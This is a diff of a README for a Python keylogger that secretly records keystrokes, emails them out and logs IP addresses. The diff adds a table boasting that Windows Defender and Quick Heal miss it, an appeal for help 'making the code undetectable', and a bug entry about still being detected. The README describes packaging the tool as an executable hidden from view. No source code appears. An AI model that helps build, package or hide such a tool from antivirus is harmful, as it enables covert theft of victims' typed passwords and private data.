@@ -1,14 +1,27 @@
 # [python-keylogger](https://github.com/EmaBixD/python-keylogger)
 Keylogger made with python that records keys and sends them to an email address, also supports IP logging.
 
-It aims for stability, open source, and constant updates.
+It aims for stability, open source, and in constant updates
+
+## Current detection
+❌ = Undetected
+
+✔ = **Detected**
+
+| Antivirus | Status |
+| - | - |
+| Windows Defender | ❌ |
+| Quick Heal | ❌ |
+| Bitdefender | ✔ |
+
+*Any help in making the code undetectable is welcome. I need help testing the code on other operating systems and antiviruses*
 
 ## Requirements
 - pynput
 - requests
 
 ## Configuration
-Make sure to enter your email address and password for sending and receiving emails in the [keylogger.py](https://github.com/EmaBixD/python-keylogger/edit/main/keylogger.py) file.
+Make sure to enter your email address and password for sending and receiving emails in the [keylogger.py](https://github.com/EmaBixD/python-keylogger/edit/main/keylogger.py) file
 
 ## BUILD AN EXECUTABLE FROM PYTHON FILE
 ### Installing pyinstaller with pip
@@ -51,8 +64,9 @@ The .vbs file, is simply used to call the .bat file without the prompt appearing
 
 ## Known bugs:
 - [x] *FIXED* Slow and laggy typing while keylogger is active, will be fixed soon
+- [ ] Still detected on many AV
 
-# ⚠ DISCLAIMER ⚠
+## ⚠ DISCLAIMER ⚠
 Usage of the provided code is at your own risk. The author assumes no responsibility for any actions taken with the code. Please ensure compliance with applicable laws and use the code responsibly. ❗
 
 ## CREDITS:
